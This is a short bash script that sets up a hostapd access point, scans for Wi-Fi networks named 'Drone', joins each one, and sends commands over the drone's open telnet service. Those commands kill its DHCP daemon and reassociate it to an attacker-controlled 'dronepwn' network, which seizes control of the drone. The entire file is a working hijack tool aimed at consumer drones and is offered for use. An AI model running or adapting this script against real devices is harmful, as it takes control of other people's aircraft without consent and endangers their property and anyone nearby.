#!/bin/bash
echo "Ensuring wifi is in a fresh state..."
# comment out below line if you do not have network manager or if found to be unnecessary for your build
nmcli radio wifi off
# sometimes your wireless card will get stuck in a soft blocked state, comment out if you find it unnecessary
rfkill unblock all
echo "Managing interfaces..."
ifconfig eth0 down
ifconfig wlan0 up
echo "Starting services..."
service hostapd start
# uncomment the two below lines to implement dhcp server and to refresh nics
#service isc-dhcp-server start
#service networking restart
# set the interface below to your hostapd ip address, be sure to make adjustments to /etc/network/interfaces as necessary
ifconfig wlan1 192.168.2.1 netmask 255.255.255.0 up
echo "Scanning for target drone AP..."
# leaving below line in for historical purposes
#drone=$(iwlist wlan0 scan | grep ESSID | grep Drone | cut -d ":" -f 2 | tr -d "\"")

ssids=( $(iwlist wlan0 scan | grep Drone | cut -d ":" -f 2 | tr -d '\"') )
for ((i=0; i<${#ssids[*]}; i++))
do
#	dhclient -r wlan0
	iwconfig wlan0 mode managed essid ${ssids[i]}
	ifconfig wlan0 192.168.1.10 netmask 255.255.255.0 up
	ifconfig wlan0 | grep netmask | cut -d ' ' -f 10
	echo "killall udhcpd && sleep 2 && iwconfig ath0 mode managed essid dronepwn && sleep 2 \
		&& ifconfig ath0 192.168.2.10$i netmask 255.255.255.0 up;" | telnet 192.168.1.1
	echo "Pinging drone..."
	sleep 6
	ping -c3 192.168.2.10$i
done

#echo "Connecting to drone AP..."
#iwconfig wlan0 mode managed essid $drone; ifconfig wlan0 192.168.1.10 netmask 255.255.255.0
#echo "Connected, telneting in..."
#echo "killall udhcpd && sleep 2 && iwconfig ath0 mode managed essid dronepwn && sleep 2 && ifconfig ath0 192.168.2.101 netmask 255.255.255.0 up;" | telnet 192.168.1.1
#echo "Give it a sec..."
#sleep 5
#ping -c3 192.168.2.101
echo Done!
